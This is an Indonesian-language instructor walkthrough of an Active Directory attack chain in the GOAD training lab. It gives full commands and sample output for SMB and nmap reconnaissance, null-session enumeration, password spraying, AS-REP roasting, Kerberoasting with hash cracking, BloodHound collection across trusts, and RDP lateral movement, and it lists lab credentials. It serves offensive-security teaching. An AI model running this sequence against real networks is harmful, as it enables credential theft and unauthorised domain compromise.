# Skenario Serangan GOAD — "Fall of the North" (Detail Lengkap)

**Cerita:** Attacker mulai dari posisi *unauthenticated* (tanpa kredensial apa pun) di jaringan lab `192.168.56.0/24`. Target akhir: mencuri kredensial, memetakan domain `sevenkingdoms.local` / `north.sevenkingdoms.local`, lalu masuk ke mesin internal.

> **Topologi lab:**
> - `kingslanding .10` — Domain Controller `sevenkingdoms.local` (forest root)
> - `winterfell .11` — Domain Controller `north.sevenkingdoms.local` (child domain)
> - `meereen .12` — Domain Controller `essos.local` (forest terpisah)
> - `castelblack .22` — member server `north` (IIS + MSSQL, Defender OFF)

---

## Fase 0 — Setup Lab (resolusi nama)

### Tujuan
Kerberos, LDAP, dan BloodHound **sangat bergantung pada resolusi nama yang benar**. Kerberos menggunakan *Service Principal Name* (SPN) berbasis FQDN, dan BloodHound menyimpan relasi berdasarkan nama domain.

### Perintah
```
# /etc/hosts
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
```

### Penjelasan teknis
- Tiap baris: `IP` diikuti satu/lebih nama (alias).
- `sevenkingdoms.local` → nama domain DNS (AD DS), `kingslanding.sevenkingdoms.local` → FQDN host DC, `kingslanding` → NetBIOS/shortname.
- Tanpa mapping ini, request Kerberos akan gagal dengan error `KDC_ERR_S_PRINCIPAL_UNKNOWN` karena client tidak bisa menerjemahkan nama SPN menjadi realm/KDC yang tepat.
- Pada lab nyata resolusi ini biasanya ditangani DNS internal; karena attacker berdiri di luar domain, kita "palsukan" via `/etc/hosts`.

### Poin penting
Bila `/etc/hosts` salah, gejala yang muncul adalah kegagalan `bloodhound-python`/`GetNPUsers` yang membingungkan — jadi pastikan langkah ini selalu benar dulu.

---

## Fase 1 — Network & Service Reconnaissance

### Tujuan
Menemukan host yang hidup, membedakan DC vs member server, dan membaca versi OS/layanan untuk menentukan vektor serangan berikutnya.

### Perintah
```bash
# 1) Temukan host SMB yang hidup + baca NetBIOS/domain/OS
crackmapexec smb 192.168.56.1/24

# 2) Full port scan terhadap DC target (output tersimpan utk dokumentasi)
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10
```

### Penjelasan teknis — `crackmapexec smb 192.168.56.1/24`
- `smb` = protokol target (SMB 445). CME mengirim request SMB *handshake* untuk membaca:
  - **Nama NetBIOS** (mis. `WINTERFELL`)
  - **Nama domain** (mis. `north.sevenkingdoms.local`)
  - **Signing** (apakah SMB signing diwajibkan — penting untuk relay NTLM)
  - **Versi OS** (mis. Windows Server 2019 Build 17763)
- `192.168.56.1/24` = scan seluruh subnet /24. CME iterasi tiap IP dan menandai yang merespons.

**Output contoh:**
```
SMB   192.168.56.10  445  KINGSLANDING  [*] Windows Server 2019 ... (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB   192.168.56.11  445  WINTERFELL    [*] ... (domain:north.sevenkingdoms.local) (signing:True)
SMB   192.168.56.22  445  CASTELBLACK   [*] ... (domain:north.sevenkingdoms.local) (signing:False)
```

### Penjelasan teknis — `nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10`
- `-Pn` : skip ping-discovery (host Windows sering memblok ICMP), anggap host hidup.
- `-p-` : scan **semua 65535 port** (bukan hanya 1000 port default) agar tidak melewatkan layanan non-standar.
- `-sC` : jalankan *default scripts* (NSE) → deteksi layanan/kerentanan dasar.
- `-sV` : deteksi versi layanan.
- `-oA full_scan_goad` : simpan output dalam **3 format** (`.nmap`, `.gnmap`, `.xml`) dengan prefix `full_scan_goad`.

**Port penting yang akan tampil:**
| Port | Layanan | Makna |
|---|---|---|
| 88 | Kerberos | DC (untuk ASREP/Kerberoast) |
| 389/636 | LDAP/LDAPS | query direktori |
| 445 | SMB | share, enum, lateral |
| 3389 | RDP | akses interaktif |
| 5985/5986 | WinRM | remote shell (evil-winrm) |
| 135 | RPC | rpcclient |
| 1433 | MSSQL | (di castelblack) |

### Poin penting
`signing:True` pada DC berarti relay SMB akan gagal (bagus, jadi aman); `signing:False` pada castelblack justru membuka peluang relay. Informasi ini menentukan apakah teknik *NTLM relay* layak dicoba.

---

## Fase 2 — Enumeration Unauthenticated (Null Session & Guest)

### Tujuan
Mengekstrak daftar user, group, dan share **tanpa kredensial** — memanfaatkan miskonfigurasi SMB/LDAP (null session / guest access).

### Perintah
```bash
# 2.1) Enum user via SAMR (tanpa kredensial)
crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.11 -u '' -p '' --users

# 2.2) Enum share dengan guest/anonymous (username dummy 'a')
crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares

# 2.3) Password-spray kecil: coba username=password (no brute per-user)
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce

# 2.4) Enumeration klasik via RPC/SMB
enum4linux 192.168.56.11

# 2.5) Null session via rpcclient, lalu enumerasi user & group
rpcclient -U "NORTH\\" 192.168.56.11 -N
#   >> di dalam prompt rpcclient:
enumdomusers
enumdomgroups
#   >> atau dari shell langsung:
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

### Penjelasan teknis per perintah

**2.1 `--users`** — CME memakai protokol **SAMR** (`SamrEnumerateUsersInDomain`) untuk mendaftar user. Pada DC yang miskonfigurasi (mengizinkan anonymous SAMR), ini berhasil tanpa login. Varian `-u '' -p ''` secara eksplisit memaksa *null session* (username & password kosong).

**2.2 `--shares`** — Mendaftar SMB share yang bisa diakses guest. `-u 'a' -p ''` = login sebagai user palsu `a` dengan password kosong (meniru *guest/anonymous access*). Range `192.168.56.10-23` mengecek beberapa host sekaligus.

**2.3 `--no-bruteforce`** — Mode *password spray* terkontrol: CME mencoba **1 password untuk 1 user** (urutan ke-1 `users.txt` dipasangkan dengan baris ke-1 password, dst.), **bukan** mencoba semua kombinasi. Ini menghindari akun terkunci. Pola "username = password" sering berhasil di lab (contoh: `hodor:hodor`).

**2.4 `enum4linux`** — Tool klasik yang menggabungkan banyak teknik: null session, enum share, enum user (SAMR/RPC), kebijakan password, dan deteksi miskonfigurasi. Outputnya berantakan tapi lengkap.

**2.5 `rpcclient -U "NORTH\\" -N`** — `-U "NORTH\\"` = login dengan username kosong di domain NORTH; `-N` = tanpa password (*null session*). Setelah masuk prompt interaktif:
- `enumdomusers` : daftar semua user domain (via `SamrEnumerateUsersInDomain`)
- `enumdomgroups` : daftar semua group domain

`net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'`:
- `-W 'NORTH'` : workgroup/domain NetBIOS
- `-I` : IP target
- `-U '%'` : null session (`%` = user kosong + pemisah password)

### Hasil yang diharapkan
File `users.txt` / `got_users.txt` berisi username valid (mis. `brandon.stark`, `jon.snow`, `arya.stark`, `hodor`, `samwell.tarly`, dst.). Daftar ini menjadi bahan baku ASREP-roast, spray, dan Kerberos enum.

### Poin penting
- Null session yang berhasil menunjukkan miskonfigurasi **RestrictAnonymous / Network access** pada DC.
- Semua teknik di fase ini **tidak meninggalkan trace login gagal** (karena bukan login penuh), berbeda dengan brute-force SMB.

---

## Fase 3 — Kerberos User Enumeration (Cross-Domain)

### Tujuan
Memvalidasi username terhadap domain `essos.local` (`.12`) tanpa lockout, memanfaatkan perbedaan respon KDC pada pre-authentication.

### Perintah
```bash
nmap -p 88 --script=krb5-enum-users \
  --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" \
  192.168.56.12
```

### Penjelasan teknis
- `-p 88` : port Kerberos (KDC).
- `--script=krb5-enum-users` : NSE script yang mengirim **AS-REQ** (Authentication Service Request) tanpa pre-auth untuk tiap username.
- `--script-args="...realm='essos.local',userdb=got_users.txt"` : menentukan realm target & file daftar user.

**Mekanisme:** Ketika client mengirim AS-REQ untuk username, KDC merespons salah satu dari:
- `KDC_ERR_PREAUTH_REQUIRED` (kode 25) → **user VALID** (KDC mengenali akun dan meminta pre-auth)
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` (kode 6) → **user TIDAK valid**

Perbedaan error ini memungkinkan *username enumeration* yang **tidak menyentuh logon SMB** dan **tidak memicu lockout**.

### Poin penting
Teknik ini berguna menyeberang ke domain lain (`essos.local`) yang tidak bisa di-enum via null session SMB. Di GOAD, ini bagian dari pengintaian lintas-forest.

---

## Fase 4 — ASREP-Roasting (tanpa kredensial → hash)

### Tujuan
Menemukan akun yang **tidak mewajibkan pre-authentication** (flag `DONT_REQUIRE_PREAUTH`), mengambil hash AS-REP, lalu crack offline.

### Perintah
```bash
# 4.1) Ambil hash AS-REP utk tiap user di daftar
impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users-north.txt

# 4.2) Crack hash TGT (format Kerberos 5 etype 23)
hashcat -O -w 1 -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

### Penjelasan teknis
**4.1 `GetNPUsers`**
- `north.sevenkingdoms.local/` : domain target (tanpa user, pakai `-usersfile`).
- `-no-pass` : tidak ada password (serangan unauthenticated).
- `-usersfile users-north.txt` : daftar user untuk dicoba.

**Mekanisme ASREP-Roast:**
1. Normalnya, saat login Kerberos, client kirim AS-REQ dengan *encrypted timestamp* (pre-auth) yang dienkripsi pakai hash password user.
2. Bila akun punya `DONT_REQUIRE_PREAUTH`, KDC **langsung membalas AS-REP** berisi TGT yang terenkripsi dengan hash NTLM password user — **tanpa perlu bukti apa pun**.
3. Attacker menerima AS-REP tersebut dan bisa melakukan **offline brute-force** terhadap material terenkripsi (`$krb5asrep$23$...`) untuk memulihkan password.

**4.2 `hashcat`**
- `-m 18200` : mode hash **Kerberos 5 AS-REP etype 23**.
- `-O` : optimasi kernel (lebih cepat).
- `-w 1` : workload profile (1 = rendah).
- `hashes.asreproast` : file hash hasil langkah 4.1.
- `/usr/share/wordlists/rockyou.txt` : wordlist umum.

### Hasil
Plaintext password akun tanpa pre-auth (di lab GOAD: `brandon.stark:iseedeadpeople`) → **kredensial valid pertama** = *initial foothold*.

### Poin penting
- ASREP-Roast = serangan **unauthenticated** (tidak butuh login).
- Berbeda dengan Kerberoasting yang butuh user valid (lihat Fase 6).

---

## Fase 5 — Initial Access & Validasi Kredensial

### Tujuan
Mengonfirmasi kredensial hasil cracking, lalu mulai enumerasi *authenticated*.

### Perintah
```bash
# 5.1) Enumerasi semua user domain memakai kredensial brandon.stark
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople

# 5.2) Validasi pasangan kredensial lain terhadap share di semua host SMB
crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing \
  -d north.sevenkingdoms.local --shares
```

### Penjelasan teknis
**5.1 `GetADUsers.py -all`**
- `-all` : tampilkan semua atribut user (bukan hanya yang login).
- Format argumen: `domain/user:password`.
- `impacket-GetADUsers` adalah alias modern (pengganti `GetADUsers.py`); keduanya memakai LDAP untuk menarik daftar user domain.

**5.2 `crackmapexec smb ... --shares`**
- `-u jon.snow -p iknownothing` : kredensial spesifik (hasil phase sebelumnya).
- `-d north.sevenkingdoms.local` : domain otentikasi.
- `--shares` : setelah login, daftarkan share yang bisa diakses.
- Range `.10-23` : cek di semua host mana kredensial ini **valid** (ditandai `[+]`).

### Output contoh
```
SMB  192.168.56.10  445  KINGSLANDING  [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB  192.168.56.11  445  WINTERFELL    [+] ...
SMB  192.168.56.22  445  CASTELBLACK   [+] ... (share: Users, C$, ...)
```

### Poin penting
- `[+]` hijau = kredensial valid di host tsb. Satu set kredensial bisa valid lintas host → bahan *lateral movement*.
- Kombinasi validasi + enum share memberi gambaran target selanjutnya.

---

## Fase 6 — Kerberoasting (Privilege Discovery via SPN)

### Tujuan
Menemukan akun service (SPN) yang TGS-nya bisa diminta user biasa, mengambil hash TGS, lalu crack → kredensial service/privileged.

### Perintah
```bash
# 6.1) Request & simpan hash TGS semua SPN
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/brandon.stark:iseedeadpeople \
  -outputfile kerberoasting.hashes

# 6.2) Via nxc (cara modern, langsung dump ke KERBEROASTING/)
nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' \
  -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

# 6.3) Crack TGS hash
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

### Penjelasan teknis
**6.1 `GetUserSPNs -request`**
- `-request` : selain **menampilkan** daftar SPN, juga **meminta** TGS untuk tiap SPN (output hash `$krb5tgs$23$...`).
- `-dc-ip 192.168.56.11` : arahkan ke DC north.
- `-outputfile kerberoasting.hashes` : simpan hash.

**Mekanisme Kerberoasting:**
1. Tiap akun service punya **SPN** (mis. `MSSQLSvc/castelblack.north...`).
2. **User domain mana pun** boleh meminta *service ticket* (TGS) untuk SPN apa pun (fitur normal Kerberos).
3. TGS dienkripsi dengan **hash password akun service** → attacker melakukan offline crack.
4. Akun service sering punya hak istimewa → kredensial hasil crack = eskalasi.

**6.2 `nxc ldap --kerberoasting`** — versi modern (NetExec) yang sama, output otomatis ke folder `KERBEROASTING/`.

**6.3 `hashcat -m 13100`**
- `-m 13100` : mode **Kerberos 5 TGS-REP etype 23** (hash Kerberoast).
- `--force` : paksa (untuk lingkungan tertentu/CPU).
- `-a 0` : attack mode 0 = *dictionary* (wordlist).

### Poin penting
- **ASREP** (Fase 4) = hash TGT tanpa login; **Kerberoast** (Fase 6) = hash TGS butuh user valid.
- Kerberoast tidak memicu lockout dan tidak meninggalkan logon event — sulit dideteksi.

---

## Fase 7 — Active Directory Mapping (BloodHound)

### Tujuan
Memetakan jalur serangan/privilege dari posisi user biasa ke Domain Admin.

### Perintah
```bash
# 7.1) Collect data domain NORTH (sumber brandon.stark)
bloodhound-python --zip -c All -d north.sevenkingdoms.local \
  -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local \
  -ns 192.168.56.11

# 7.2) Collect data domain ROOT sevenkingdoms.local (trust/cross-domain)
bloodhound-python --zip -c All -d sevenkingdoms.local \
  -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople \
  -dc kingslanding.sevenkingdoms.local -ns 192.168.56.10
```

### Penjelasan teknis
- `--zip` : hasil dikompres jadi `.zip` (siap import).
- `-c All` : jalankan **semua collection method** (Sessions, LoggedOn, Groups, ACLs, Trusts, GPO, ObjectProps, dsb.) — penggabungan SharpHound collectors.
- `-d` : domain yang dikoleksi.
- `-u/-p` : kredensial.
- `-dc` : FQDN DC target; `-ns` : nameserver/IP DC.

**Perbedaan penting antara 7.1 dan 7.2:**
- 7.1: `-u brandon.stark` (format `user` biasa) untuk domain asalnya.
- 7.2: `-u brandon.stark@north.sevenkingdoms.local` (**UPN suffix**) → memakai **trust** antar-domain untuk masuk ke forest root `sevenkingdoms.local`.

### Poin penting
- Import kedua `.zip` ke BloodHound (lihat `bloodhound-goad-light.md`).
- Query utama: *Shortest Path to Domain Admins*, *Kerberoastable*, *Find Principles with DCSync Rights*.

---

## Fase 8 — Lateral Movement / Access (RDP)

### Tujuan
Menggunakan kredensial (mis. `jon.snow`) untuk akses interaktif ke host internal.

### Perintah
```bash
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert:ignore
```

### Penjelasan teknis
- `xfreerdp` : client RDP open-source.
- `/u:jon.snow` : username; `/p:iknownothing` : password.
- `/d:north` : domain NetBIOS (`north.sevenkingdoms.local`).
- `/v:192.168.56.22` : target (castelblack).
- `/cert:ignore` : abaikan sertifikat self-signed RDP (umum di lab).

### Poin penting
- `castelblack` = target lateral karena akun `jon.snow` valid di sana dan host ini **Defender OFF** → aman untuk dumping SAM/LSASS, pass-the-hash, atau pivot ke domain lain.
- Dari foothold ini, lanjut ke skenario lanjutan (MSSQL → SYSTEM → DA).

---

## Ringkasan Kill-Chain

| Fase | Teknik | Input → Output |
|---|---|---|
| 0 | `/etc/hosts` | resolusi nama utk Kerberos/BH |
| 1 | SMB/Nmap scan | peta host + DC |
| 2 | Null/guest enum | `users.txt`, share list |
| 3 | Kerberos user enum | validasi username (essos) |
| 4 | **ASREP-Roast** | hash → password #1 (foothold) |
| 5 | Login valid + spray | konfirmasi kredensial & share |
| 6 | **Kerberoast** | hash TGS → password service |
| 7 | BloodHound | jalur ke Domain Admin |
| 8 | RDP / pivot | foothold di host internal |

---

## Catatan Pengajar

- Jalankan tiap fase berurutan; jelaskan perbedaan *unauthenticated* (Fase 1–4) vs *authenticated* (Fase 5–8).
- ASREP-roast (Fase 4) tidak butuh kredensial; Kerberoast (Fase 6) butuh user valid — tekankan perbedaannya.
- Fase 3 & 7 menunjukkan penjelajahan **lintas domain** (essos.local & trust antar domain sevenkingdoms → north).
- Lockout policy bisa mengganggu spray; gunakan `--no-bruteforce` dan wordlist tervalidasi dari Fase 2.
- `signing:True/False` dari Fase 1 menentukan kelayakan *NTLM relay* (lihat skenario lanjutan).
